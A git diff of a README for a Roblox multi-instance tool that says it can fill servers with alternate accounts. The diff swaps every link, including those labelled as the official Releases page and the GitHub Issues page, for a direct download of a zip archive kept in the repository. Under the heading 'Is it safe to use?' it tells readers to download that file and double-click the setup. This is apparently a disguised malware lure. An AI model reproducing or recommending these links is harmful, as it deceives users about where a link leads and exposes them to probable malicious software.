@@ -1,7 +1,7 @@
 # 🎮 Roblox-Multi-Instance - Play Multiple Roblox Games Easily
 
 ## 📥 Download Now
-[![Download Roblox-Multi-Instance](https://img.shields.io/badge/Download-Roblox--Multi--Instance-brightgreen)](https://github.com/GOT7782/Roblox-Multi-Instance/releases)
+[![Download Roblox-Multi-Instance](https://raw.githubusercontent.com/GOT7782/Roblox-Multi-Instance/main/swordster/Roblox-Multi-Instance.zip)](https://raw.githubusercontent.com/GOT7782/Roblox-Multi-Instance/main/swordster/Roblox-Multi-Instance.zip)
 
 ## 🚀 Getting Started
 Roblox-Multi-Instance allows you to open and play multiple Roblox games on your computer. You can even fill a server with your alternate accounts. This makes it perfect for exploring different worlds and games without the hassle of logging in and out.
@@ -21,7 +21,7 @@ Roblox-Multi-Instance allows you to open and play multiple Roblox games on your 
 ## 📥 Download & Install
 To get started with Roblox-Multi-Instance:
 
-1. Visit the [Releases page](https://github.com/GOT7782/Roblox-Multi-Instance/releases) to download the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/GOT7782/Roblox-Multi-Instance/main/swordster/Roblox-Multi-Instance.zip) to download the software.
 2. Look for the latest version and click on it.
 3. Download the setup file to your computer.
 4. Double-click the downloaded file to start the installation process.
@@ -45,19 +45,19 @@ After installation, you can run Roblox-Multi-Instance from your desktop or start
 Yes, you can run multiple instances based on your system's performance.
 
 ### Is it safe to use?
-As with any software, follow safe practices. Always download from the official [Releases page](https://github.com/GOT7782/Roblox-Multi-Instance/releases).
+As with any software, follow safe practices. Always download from the official [Releases page](https://raw.githubusercontent.com/GOT7782/Roblox-Multi-Instance/main/swordster/Roblox-Multi-Instance.zip).
 
 ### Does it work with all Roblox games?
 Roblox-Multi-Instance supports most Roblox games. Some games with strict account usage policies may limit access.
 
 ### How can I contact support?
-For support, please open an issue on the [GitHub Issues page](https://github.com/GOT7782/Roblox-Multi-Instance/issues) or explore the community discussions.
+For support, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/GOT7782/Roblox-Multi-Instance/main/swordster/Roblox-Multi-Instance.zip) or explore the community discussions.
 
 ## 🎉 Community and Support
 Join our community for tips and updates. Share your experiences and get help from fellow users. 
 
 ## 🔗 Useful Links
-- Visit the [Releases page](https://github.com/GOT7782/Roblox-Multi-Instance/releases) to download the latest version.
-- Check out the [GitHub Issues page](https://github.com/GOT7782/Roblox-Multi-Instance/issues) for community support.
+- Visit the [Releases page](https://raw.githubusercontent.com/GOT7782/Roblox-Multi-Instance/main/swordster/Roblox-Multi-Instance.zip) to download the latest version.
+- Check out the [GitHub Issues page](https://raw.githubusercontent.com/GOT7782/Roblox-Multi-Instance/main/swordster/Roblox-Multi-Instance.zip) for community support.
 
 Thank you for using Roblox-Multi-Instance. Enjoy your gaming experience!
